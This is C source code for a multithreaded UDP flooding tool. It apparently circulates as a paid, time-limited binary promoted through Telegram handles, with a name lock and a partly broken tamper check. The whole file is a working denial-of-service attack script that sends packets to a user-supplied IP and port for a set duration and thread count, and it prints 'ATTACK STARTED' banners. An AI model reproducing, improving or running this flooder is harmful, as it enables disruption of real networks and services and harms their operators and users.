#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>

#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define WHITE   "\033[1;37m"
#define RESET   "\033[0m"

#define BUFFER_SIZE 6500
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 3
#define EXPIRATION_DAY 5

char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_tampering(const char *binary_name) {
    unsigned long current_crc = calculate_crc32(binary_name);
    if (current_crc != EXPECTED_CRC32) {
        printf(RED "⚠️ WARNING! PAPA FLASH! ⚠️\n" RESET);
        printf(RED "██████╗  █████╗ ██████╗  █████╗                 \n");
        printf("██╔══██╗██╔══██╗██╔══██╗██╔══██╗                \n");
        printf("██████╔╝███████║██████╔╝███████║                \n");
        printf("██╔═══╝ ██╔══██║██╔═══╝ ██╔══██║                \n");
        printf("██║     ██║  ██║██║     ██║  ██║                \n");
        printf("╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝                \n\n");
        printf("███████╗██╗      █████╗ ███████╗██╗  ██╗        \n");
        printf("██╔════╝██║     ██╔══██╗██╔════╝██║  ██║        \n");
        printf("█████╗  ██║     ███████║███████╗███████║        \n");
        printf("██╔══╝  ██║     ██╔══██║╚════██║██╔══██║        \n");
        printf("██║     ███████╗██║  ██║███████║██║  ██║        \n");
        printf("╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        \n" RESET);
        exit(EXIT_FAILURE);
    }
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);
    double remaining_time = difftime(mktime(&expiration_date), now);
    
    if (remaining_time <= 0) {
        printf(RED "🔥 ===========================\n");
        printf("🔥 𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗦𝗘𝗗 𝗕𝗬 @TF_FLASH92 🔥\n");
        printf("🚀 𝗗𝗠 𝗧𝗢 𝗕𝗨𝗬 𝗡𝗘𝗪 𝗙𝗜𝗟𝗘 @TF_FLASH92 🚀\n");
        printf("🔥 ===========================\n" RESET);
        exit(EXIT_FAILURE);
    } else {
        printf(YELLOW "⏳ TIME REMAINING UNTIL EXPIRATION: %.0f SECONDS ⏳\n" RESET, remaining_time);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror(RED "Socket creation failed" RESET);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror(RED "Invalid address / Address not supported" RESET);
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;
    
    printf(GREEN "⚡ ATTACK STARTED ON %s:%d FOR %d SECONDS WITH %d THREADS ⚡\n" RESET, ip, port, duration, *((int *)arg));

    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            perror(RED "Send failed" RESET);
            close(sock);
            pthread_exit(NULL);
        }
    }

    printf(RED "🔥 ATTACK FINISHED ON %s:%d 🔥\n" RESET, ip, port);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    check_expiration();

    // Ensure the binary name is "Altubhai"
    char *binary_name = basename(argv[0]);  
    if (strcmp(binary_name, "Altubhai") != 0) {
        printf(RED "\n🔥 ERROR: BINARY MUST BE 'Altubhai' 🔥\n" RESET);
        exit(EXIT_FAILURE);
    }

    if (argc != 5) {
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, CYAN "🚀 USAGE: %s <IP> <PORT> <DURATION> <THREADS> 🚀\n", argv[0]);
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, GREEN "⚡ AFTER EXPIRE DM @TF_FLASH92 ⚡\n");
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, YELLOW "🔥 THIS EXPIRES ON %d-%02d-%02d 🔥\n", EXPIRATION_YEAR, EXPIRATION_MONTH, EXPIRATION_DAY);
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, CYAN "🚀 OWNER: @TF_FLASH92 🚀\n");
        fprintf(stderr, RED "🔥 ===========================\n");
        fprintf(stderr, GREEN "🔥 JOIN CHANNEL TO MORE PAID BINARY 🔥\n");
        fprintf(stderr, RED "🔥 ===========================\n" RESET);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("FLASHxDILDOS1");
    
    printf(BLUE "🎯 JOIN :- @FLASHxDILDOS1 | CRC32: %lx 🎯\n" RESET, crc);
    
    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, &threads) != 0) {
            perror(RED "Thread creation failed" RESET);
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
